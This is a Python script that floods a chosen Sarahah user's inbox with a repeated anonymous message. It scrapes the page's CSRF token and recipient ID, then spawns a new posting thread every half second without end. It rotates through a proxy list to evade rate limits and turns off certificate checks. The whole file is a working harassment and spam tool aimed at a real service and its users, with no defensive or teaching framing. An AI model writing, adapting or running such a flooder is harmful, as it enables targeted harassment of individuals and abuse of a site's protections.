import time,requests,sys,_thread,re,os#,urllib3,os;urllib3.disable_warnings()
try:
    usr=sys.argv[1]
    headers = {
        'Origin': 'https://' + usr + '.sarahah.com',
        'User-Agent': "Mozilla/5.0 (Linux; Android 7.0; PLUS Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': '*/*','Referer': 'https://' + usr + '.sarahah.com/','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.8','X-Requested-With': 'XMLHttpRequest',
        }
    def sendts(user,msg,proxy):
        with requests.Session() as s:
            txt= s.get('https://' + user + '.sarahah.com/').text
            lst=[re.sub('value=|"',"",i) for i in txt.split() if 'value="' in i]
            csrftoken,recipientid  = lst[1] if len(lst)>1 else "" ,"" if not lst else lst[0]
            data = {'__RequestVerificationToken': csrftoken , 'userId': recipientid ,'text': msg}
            try:s.post("https://"+ user +".sarahah.com/Messages/SendMessage", data=data,headers=headers,verify=False,proxies=proxy)
            except:pass
            os.system('cls' if "win" in sys.platform else "clear" if "linux" in sys.platform else "exit")
            print(u"\u001b[34;1m CT :"+csrftoken+"\u001b[0m")
            print(u"\u001b[31;1m RI :"+recipientid+"\u001b[0m")
            print(u"\u001b[33;1m PR :"+str(proxy)+"\u001b[0m")
            print(u'\u001b[30;1m'+"######################################"+"\u001b[0m")
    ip = [{'http':'http://'+str(i.split("\n")[0])} for i in open("tools/proxy.list")]
    counter,lip=[0,len(ip)]

    while True:
        counter+=1
        if counter==lip:counter=0
        _thread.start_new_thread(sendts,(usr, sys.argv[2], ip[counter]))
        time.sleep(0.5)
except:print(sys.argv[0].split("/")[::-1][0]+u"\u001b[31m"+" [User] [Message]"+"\u001b[0m");print(u"\u001b[31m Ex : \u001b[0m%s\u001b[35m test 123 \u001b[0m \n"%(sys.argv[0].split("/")[::-1][0]))
